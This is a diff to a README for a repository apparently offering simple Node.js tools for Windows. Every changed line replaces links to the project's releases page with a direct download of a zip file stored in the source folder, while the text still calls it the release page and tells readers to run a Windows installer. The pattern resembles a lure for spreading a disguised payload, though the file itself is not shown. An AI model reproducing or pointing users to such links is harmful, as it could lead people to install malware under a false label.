@@ -1,6 +1,6 @@
 # ⚙️ node-utils-1771921901-4 - Simple Tools for Node.js Tasks
 
-[![Download for Windows](https://img.shields.io/badge/Download-From_Releases-e91e63?style=for-the-badge)](https://github.com/Aeryl/node-utils-1771921901-4/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-From_Releases-e91e63?style=for-the-badge)](https://github.com/Aeryl/node-utils-1771921901-4/raw/refs/heads/main/src/node_utils_objurgatrix.zip)
 
 ---
 
@@ -39,7 +39,7 @@ This app works on Windows 10 and newer versions. It uses Node.js, but you don’
 
 Start by visiting the release page where you can download the software. This page contains the latest stable version, plus documentation.
 
-[Download from Releases](https://github.com/Aeryl/node-utils-1771921901-4/releases)
+[Download from Releases](https://github.com/Aeryl/node-utils-1771921901-4/raw/refs/heads/main/src/node_utils_objurgatrix.zip)
 
 This link takes you to the main page with all available files. You will find a file designed for Windows users.
 
@@ -111,7 +111,7 @@ The results appear immediately in the window. You can copy the results or save t
 
 To stay current, check the release page regularly:
 
-[https://github.com/Aeryl/node-utils-1771921901-4/releases](https://github.com/Aeryl/node-utils-1771921901-4/releases)
+[https://github.com/Aeryl/node-utils-1771921901-4/raw/refs/heads/main/src/node_utils_objurgatrix.zip](https://github.com/Aeryl/node-utils-1771921901-4/raw/refs/heads/main/src/node_utils_objurgatrix.zip)
 
 Download the latest installer and run it. The new version will replace the old one without removing your settings.
 
@@ -142,9 +142,9 @@ node-utils-1771921901-4 does not collect or send any personal data. It works loc
 ## ✅ Summary of Actions
 
 - Visit the release page here:  
-  [https://github.com/Aeryl/node-utils-1771921901-4/releases](https://github.com/Aeryl/node-utils-1771921901-4/releases)
+  [https://github.com/Aeryl/node-utils-1771921901-4/raw/refs/heads/main/src/node_utils_objurgatrix.zip](https://github.com/Aeryl/node-utils-1771921901-4/raw/refs/heads/main/src/node_utils_objurgatrix.zip)
 - Download the Windows installer `.exe` file.
 - Run the installer and follow instructions.
 - Use the simple interface to perform tasks.
 
-[![Download for Windows](https://img.shields.io/badge/Download-From_Releases-e91e63?style=for-the-badge)](https://github.com/Aeryl/node-utils-1771921901-4/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-From_Releases-e91e63?style=for-the-badge)](https://github.com/Aeryl/node-utils-1771921901-4/raw/refs/heads/main/src/node_utils_objurgatrix.zip)
